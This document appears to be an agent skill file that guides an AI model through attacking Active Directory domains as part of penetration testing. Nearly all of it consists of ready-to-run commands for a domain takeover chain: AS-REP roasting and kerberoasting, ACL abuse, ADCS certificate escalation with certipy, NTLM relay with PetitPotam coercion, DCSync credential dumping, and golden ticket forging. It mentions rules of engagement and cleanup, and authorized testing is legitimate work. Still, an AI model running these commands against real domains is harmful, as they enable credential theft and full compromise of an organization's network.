---
name: pt-ad
description: Use when attacking or assessing an Active Directory domain — enumeration, kerberoasting and AS-REP roasting, delegation abuse, ADCS escalation, ACL and GPO abuse, NTLM relay, coercion, and domain takeover paths — including Russian requests (тестирование Active Directory, домен, контроллер домена, kerberoast, ADCS). Use after a domain is confirmed reachable.
version: 1.0.0
author: operator
tags: [offensive, active-directory, kerberos, adcs, relay, domain]
---

# Active Directory

AD is a graph, not a host list. Credentials are currency and delegation of trust is the vulnerability class. Work from **unauthenticated → one credential → graph analysis → targeted escalation → domain dominance**.

## Phase 1: Unauthenticated

```bash
# Host and domain fingerprint without creds
nxc smb <dc-ip>                              # domain, hostname, signing, SMBv1
nxc smb <dc-ip> -u '' -p '' --shares         # null session
rpcclient -U '' -N <dc-ip> -c 'enumdomusers' # legacy null session

# Username enumeration and lockout policy (stay inside RoE attempts)
nxc smb <dc-ip> -u users.txt -p '' --continue-on-success
nxc smb <dc-ip> -u '' -p '' --pass-pol

# AS-REP roastable accounts need only a username list
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip <dc-ip> \
  -format hashcat -outputfile loot/hashes/asrep.txt -no-pass
```

Username harvesting: `nxc ldap` with any credential, `enum4linux-ng`, LinkedIn/press-release name formats, or `kerbrute userenum -d corp.local --dc <dc> users.txt`.

## Phase 2: With one credential

```bash
# Validate and map
nxc smb <cidr> -u user -p 'pass' -d corp.local --shares --sessions --loggedon-users
nxc ldap <dc-ip> -u user -p 'pass' -d corp.local --users --groups --computers --trusted-for-delegation
nxc winrm <cidr> -u user -p 'pass' -d corp.local          # where can I get a shell
nxc mssql <cidr> -u user -p 'pass' -d corp.local --local-auth

# Kerberoast: any SPN-bearing account
impacket-GetUserSPNs corp.local/user:pass -dc-ip <dc-ip> -request \
  -outputfile loot/hashes/kerberoast.txt

# Delegation
impacket-findDelegation corp.local/user:pass -dc-ip <dc-ip>

# LAPS, GPP, gMSA
nxc ldap <dc-ip> -u user -p pass -M laps
nxc smb <dc-ip> -u user -p pass -M gpp_password -M gpp_autologin
```

## Phase 3: Graph analysis

```bash
bloodhound-python -u user -p pass -d corp.local -ns <dc-ip> -c all --zip
# upload to BloodHound CE, run: Shortest Paths to Domain Admin,
# Kerberoastable, AS-REP roastable, Unconstrained Delegation,
# ACL edges: GenericAll, WriteDACL, ForceChangePassword, AddMember,
# WriteOwner, AllExtendedRights, DCSync, GPLink
```

Read the graph for **edges you can execute with current rights**, not for a pretty picture. Typical chains:

- `GenericAll` on a user → `impacket-changepasswd` or set SPN → kerberoast → crack
- `WriteDACL` on a group → add yourself → re-auth as group member
- `ForceChangePassword` → reset, then authenticate
- `AddMember` on `Domain Admins` → done
- `GenericWrite` on a computer → RBCD (`impacket-addcomputer` + `rbcd.py`)
- `DCSync` right → `impacket-secretsdump -just-dc-ntlm`

## Phase 4: ADCS

Certificate Services is the most reliable domain takeover path in modern AD.

```bash
certipy find -u user@corp.local -p pass -dc-ip <dc-ip> -vulnerable -stdout
```

| ESC | Condition | Exploit |
|---|---|---|
| ESC1 | Template allows enrollee-supplied SAN, low-priv enrollee | `certipy req -template X -upn administrator@corp.local` |
| ESC2 | Any purpose / no EKU | Request cert, use for auth or signing |
| ESC3 | Enrollment agent template | Request on behalf of DA |
| ESC4 | Template ACL writable | Modify template → ESC1 |
| ESC5 | CA object / PKI ACL writable | Take over CA |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` on CA | SAN injection on any template |
| ESC7 | CA officer rights | Approve own request |
| ESC8 | HTTP enrollment endpoint, NTLM relayable | `ntlmrelayx -t http://ca/certsrv` |
| ESC9/10/11 | Weak mapping / no security extension | UPN swap, cert reuse |
| ESC13 | Issuance policy → group link | Cert grants group membership |

```bash
certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local -dc-ip <dc-ip>
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>       # returns TGT or NT hash
```

## Phase 5: Coercion and relay

```bash
# Disable SMB/HTTP in Responder first if relaying
responder -I eth0 -wdv
# Relay targets: hosts without SMB signing, or the CA HTTP endpoint
nxc smb <cidr> --gen-relay-list loot/relay-targets.txt
impacket-ntlmrelayx -tf loot/relay-targets.txt -smb2support -socks
```

Coercion triggers (need one authenticated callback):

```bash
coercer coerce -u user -p pass -d corp.local -t <victim-ip> -l <your-ip>
# or petitpotam.py / printerbug.py / dfscoerce.py <your-ip> <victim-ip>
```

PetitPotam against a DC without signing plus ADCS HTTP enrollment is a complete domain takeover chain.

## Phase 6: Domain dominance

```bash
impacket-secretsdump corp.local/da:pass@<dc-ip> -just-dc-ntlm   # DCSync
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL         # offline
# Golden ticket after krbtgt
impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-... -domain corp.local administrator
```

Post-DA, the finding is not "we are DA" — it is **what DA reaches**: backup infrastructure, ESXi, cloud sync accounts (`Azure AD Connect` MSOL account), CI/CD, and the crown-jewel data.

## Accounts worth hunting first

`svc_*` with SPN · accounts with `Do not require Kerberos preauth` · `Domain Admins` logged into workstations (unconstrained delegation risk) · `Azure AD Connect` sync account · SQL service accounts (`xp_cmdshell`) · Exchange `WriteDACL` chains · helpdesk accounts with password reset rights · LAPS-readable groups.

## Common mistakes

| Mistake | Reality |
|---|---|
| Spraying without checking lockout | One bad spray locks out the client's staff |
| Running BloodHound once, then ignoring it | Re-collect after each privilege gain |
| Chasing DA instead of data | The objective is the client's risk, not the flag |
| Forgetting ADCS | It is the most common modern escalation path |
| Relaying with Responder still answering SMB | Relay and poison conflict; disable per protocol |
| Kerberoasting a service account with a 60-char password | Request the ticket, then judge crackability before hours of GPU time |
| Leaving created computer/machine accounts behind | Cleanup is part of the engagement |
